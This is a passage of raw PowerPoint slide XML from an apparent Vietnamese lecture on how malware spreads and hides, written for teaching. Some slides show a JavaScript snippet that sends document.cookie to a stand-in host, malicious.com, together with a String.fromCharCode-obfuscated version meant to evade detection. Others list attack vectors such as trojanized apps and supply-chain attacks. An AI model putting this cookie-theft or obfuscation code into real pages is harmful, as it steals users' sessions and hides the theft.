                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> code)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Giả</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sử</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một</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đoạn</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mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>gốc</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để</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đánh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cắp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> cookie:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> cookie = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = new Image();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>img.src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = "http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>malicious.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>steal?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=" + cookie;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14936208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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Obfuscation (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>làm</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rối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> code)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sau </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khi obfuscation, mã được làm rối bằng cách đổi tên biến, mã hóa chuỗi, hoặc chèn ký tự thừa:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var a = String.fromCharCode;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var b = document[a(99)+a(111)+a(111)+a(107)+a(105)+a(101)];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var c = new Image();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>c[a(115)+a(114)+a(99)] = "http://malicious.com/steal?c=" + b;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176940628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464502"/>
            <a:ext cx="8604913" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.4.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phát tán &amp; che giấu</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Malware</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7" y="993353"/>
            <a:ext cx="10174407" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Obfuscation (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>làm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> code)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sau </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khi obfuscation, mã được làm rối bằng cách đổi tên biến, mã hóa chuỗi, hoặc chèn ký tự thừa:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>a = String.fromCharCode;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var b = document[a(99)+a(111)+a(111)+a(107)+a(105)+a(101)];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var c = new Image();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>c[a(115)+a(114)+a(99)] = "http://malicious.com/steal?c=" + b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chức </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>năng không thay đổi (vẫn gửi cookie về server kẻ tấn công),</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>nhưng rất khó đọc và phân tích thủ công, giúp Malware né tránh hệ thống phát hiện.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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299008705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Malware</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Các phương thức tấn công chính</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Trojanized Applications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ứng dụng có chức năng bình thường nhưng bị gắn thêm mã độc (Trojan).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khi người dùng cài đặt, malware hoạt động ngầm (keylogger, đánh cắp mật khẩu).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b. Drive-by Download</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Người dùng chỉ cần truy cập trang web độc hại → ứng dụng/malware tự động tải về và cài đặt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Không cần sự cho phép rõ ràng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="151575243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Malware</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Các phương thức tấn công chính</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>c. Malicious Plugins / Add-ons</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Các tiện ích mở rộng (plugin, extension) chứa mã độc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ: add-on trình duyệt theo dõi lịch sử duyệt web và gửi dữ liệu về máy chủ hacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>d. Mã độc ẩn trong file dữ liệu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ứng dụng mở file (PDF, DOCX, XLSX) có thể bị chèn exploit code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khi mở file, mã khai thác được thực thi → cài đặt malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>e. Tấn công chuỗi cung ứng (Supply Chain Attack)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hacker chèn malware vào bản cập nhật phần mềm hợp pháp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
